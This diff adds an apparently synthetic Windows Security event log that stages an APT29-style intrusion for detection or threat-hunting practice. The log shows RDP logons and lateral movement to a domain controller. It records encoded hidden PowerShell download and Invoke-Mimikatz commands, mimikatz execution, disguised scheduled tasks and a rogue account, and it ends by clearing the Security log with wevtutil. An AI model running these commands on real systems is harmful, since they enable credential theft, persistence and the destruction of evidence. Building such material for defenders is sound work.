@@ -1,0 +1,180 @@
+# =============================================================================
+# APT29 / Cozy Bear — SolarWinds-style Lateral Movement
+# Fuente: MITRE ATT&CK G0016 — actividad documentada 2020-2021
+# Duración del ataque: 45 minutos (09:15 – 10:00 UTC)
+# Host víctima inicial: CORP-GATEWAY-01 / Red: 10.10.0.0/16
+# =============================================================================
+
+EventID=4624
+Date/Time=2025-03-15T09:15:33Z
+Account Name=svc_backup
+Account Domain=MEDIGROUP
+Source Network Address=91.108.4.11
+Logon Type=10
+Workstation Name=CORP-GATEWAY-01
+Failure Reason=-
+
+EventID=4672
+Date/Time=2025-03-15T09:16:07Z
+Account Name=svc_backup
+Account Domain=MEDIGROUP
+Source Network Address=91.108.4.11
+Logon Type=10
+Workstation Name=CORP-GATEWAY-01
+
+EventID=4688
+Date/Time=2025-03-15T09:17:55Z
+Account Name=svc_backup
+Account Domain=MEDIGROUP
+New Process ID=0x0c14
+New Process Name=C:\Windows\System32\cmd.exe
+Creator Process Name=C:\Windows\explorer.exe
+
+EventID=4688
+Date/Time=2025-03-15T09:18:42Z
+Account Name=svc_backup
+Account Domain=MEDIGROUP
+New Process ID=0x1e8c
+New Process Name=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -enc JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA
+Creator Process Name=C:\Windows\System32\cmd.exe
+
+EventID=4688
+Date/Time=2025-03-15T09:20:11Z
+Account Name=svc_backup
+Account Domain=MEDIGROUP
+New Process ID=0x21a0
+New Process Name=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAcwA6AC8A -bypass -ExecutionPolicy bypass
+Creator Process Name=C:\Windows\System32\cmd.exe
+
+EventID=4648
+Date/Time=2025-03-15T09:21:50Z
+Account Name=svc_backup
+Account Domain=MEDIGROUP
+Source Network Address=10.10.0.5
+Logon Type=9
+Workstation Name=CORP-GATEWAY-01
+
+EventID=4624
+Date/Time=2025-03-15T09:22:14Z
+Account Name=svc_backup
+Account Domain=MEDIGROUP
+Source Network Address=10.10.0.5
+Logon Type=10
+Workstation Name=WKSTN-FIN-01
+
+EventID=4672
+Date/Time=2025-03-15T09:22:48Z
+Account Name=svc_backup
+Account Domain=MEDIGROUP
+Source Network Address=10.10.0.5
+Workstation Name=WKSTN-FIN-01
+
+EventID=4624
+Date/Time=2025-03-15T09:25:37Z
+Account Name=svc_backup
+Account Domain=MEDIGROUP
+Source Network Address=10.10.0.5
+Logon Type=10
+Workstation Name=WKSTN-HR-02
+
+EventID=4672
+Date/Time=2025-03-15T09:26:10Z
+Account Name=svc_backup
+Account Domain=MEDIGROUP
+Source Network Address=10.10.0.5
+Workstation Name=WKSTN-HR-02
+
+EventID=4624
+Date/Time=2025-03-15T09:29:03Z
+Account Name=svc_backup
+Account Domain=MEDIGROUP
+Source Network Address=10.10.0.5
+Logon Type=10
+Workstation Name=WKSTN-DEV-03
+
+EventID=4624
+Date/Time=2025-03-15T09:32:44Z
+Account Name=svc_backup
+Account Domain=MEDIGROUP
+Source Network Address=10.10.0.5
+Logon Type=10
+Workstation Name=DC-CORP-01
+
+EventID=4672
+Date/Time=2025-03-15T09:33:01Z
+Account Name=svc_backup
+Account Domain=MEDIGROUP
+Source Network Address=10.10.0.5
+Workstation Name=DC-CORP-01
+
+EventID=4698
+Date/Time=2025-03-15T09:35:18Z
+Account Name=svc_backup
+Account Domain=MEDIGROUP
+Source Network Address=10.10.0.5
+Task Name=\Microsoft\Windows\Update\SvcHostUpdate
+
+EventID=4688
+Date/Time=2025-03-15T09:40:05Z
+Account Name=svc_backup
+Account Domain=MEDIGROUP
+New Process ID=0x3b20
+New Process Name=C:\Windows\Temp\mimikatz.exe
+Creator Process Name=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+
+EventID=4688
+Date/Time=2025-03-15T09:44:32Z
+Account Name=svc_backup
+Account Domain=MEDIGROUP
+New Process ID=0x3c90
+New Process Name=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoA -nop -w hidden
+Creator Process Name=C:\Windows\Temp\mimikatz.exe
+
+EventID=4720
+Date/Time=2025-03-15T09:47:59Z
+Account Name=helpdesk_temp
+Account Domain=MEDIGROUP
+Source Network Address=10.10.0.5
+
+EventID=4732
+Date/Time=2025-03-15T09:48:31Z
+Account Name=helpdesk_temp
+Account Domain=MEDIGROUP
+Source Network Address=10.10.0.5
+
+EventID=4624
+Date/Time=2025-03-15T09:51:00Z
+Account Name=helpdesk_temp
+Account Domain=MEDIGROUP
+Source Network Address=10.10.0.5
+Logon Type=2
+Workstation Name=DC-CORP-01
+
+EventID=4672
+Date/Time=2025-03-15T09:51:44Z
+Account Name=helpdesk_temp
+Account Domain=MEDIGROUP
+Source Network Address=10.10.0.5
+Workstation Name=DC-CORP-01
+
+EventID=4698
+Date/Time=2025-03-15T09:54:07Z
+Account Name=helpdesk_temp
+Account Domain=MEDIGROUP
+Source Network Address=10.10.0.5
+Task Name=\Microsoft\Windows\Maintenance\HealthCheck
+
+EventID=4688
+Date/Time=2025-03-15T09:58:12Z
+Account Name=svc_backup
+Account Domain=MEDIGROUP
+New Process ID=0x4f10
+New Process Name=C:\Windows\System32\wevtutil.exe cl Security
+Creator Process Name=C:\Windows\System32\cmd.exe
+
+EventID=1102
+Date/Time=2025-03-15T10:00:00Z
+Account Name=svc_backup
+Account Domain=MEDIGROUP
+Source Network Address=10.10.0.5
+Workstation Name=DC-CORP-01
